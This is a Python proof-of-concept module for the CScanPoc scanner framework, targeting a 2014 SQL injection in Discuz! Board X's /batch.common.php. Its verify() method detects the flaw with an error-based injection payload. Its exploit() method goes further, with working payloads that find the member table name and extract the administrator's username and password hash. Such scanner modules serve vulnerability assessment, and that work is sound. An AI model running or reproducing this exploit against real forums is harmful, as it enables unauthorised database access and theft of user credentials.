# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Discuz_0012'  # 平台漏洞编号，留空
    name = 'Discuz! Board X /batch.common.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-24'  # 漏洞公布时间
    desc = '''
        Discuz! Board X /batch.common.php 存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '1.0.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'dcd30c14-75ce-450c-8a98-561dc456e94d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '%s/batch.common.php' % self.target
            payload = '?action=modelquote&cid=1&name=spacecomments,(SELECT 3284 FROM(SELECT COUNT(*),CONCAT(CH' \
                      'AR(58,105,99,104,58),(MID((IFNULL(CAST(md5(160341893519135) AS CHAR),CHAR(32))),1,50)),' \
                      'CHAR(58,107,111,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)'
            content = requests.get(verify_url + payload).text

            if '3c6b20b60b3f57247420047ab16d3d71' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            table_priv = ''
            username = ''
            password = ''
            verify_url = '%s/batch.common.php' % self.target
            payload_table_priv = '?action=modelquote&cid=1&name=spacecomments,(SELECT%206050%20FROM(SELECT%20C' \
                                 'OUNT(*),CONCAT(CHAR(58,114,103,101,58),(SELECT%20MID((IFNULL(CAST(table_name' \
                                 '%20AS%20CHAR),CHAR(32))),1,50)%20FROM%20information_schema.tables%20where%20' \
                                 'table_schema=database()%20LIMIT%200,1),CHAR(58,110,98,115,58),FLOOR(RAND(0)*' \
                                 '2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)'
            match_table_priv = re.compile(':rge:(.*)access:nbs:1')
            try:
                table_priv = match_table_priv.findall(
                    requests.get(verify_url + payload_table_priv).text)[0]
            except:
                pass

            table_priv = 'cdb_' if table_priv == '[Table]' else table_priv
            payload = '?action=modelquote&cid=1&name=spacecomments,(SELECT%206050%20FROM(SELECT%20COUNT(*),CON' \
                      'CAT(CHAR(58,114,103,101,58),(SELECT%20MID((IFNULL(CAST(concat(username,0x3a3a,password)' \
                      '%20AS%20CHAR),CHAR(32))),1,50)%20FROM%20' + table_priv + 'members%20LIMIT%200,1),CHAR(5' \
                      '8,110,98,115,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)'
            match_result = re.compile(':rge:(.*)::([\w\d]{32}):nbs:')
            try:
                username, password = match_result.findall(
                    requests.get(verify_url + payload).text)[0]
            except:
                pass

            if username and password:
                #args['success'] = True
                #args['poc_ret']['vul_url'] = verify_url
                #args['poc_ret']['username'] = username
                #args['poc_ret']['password'] = password
                self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，用户名：{name}，密码：{passwd}'.format(
                    target=self.target, vulnname=self.vuln.name, name=username, passwd=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
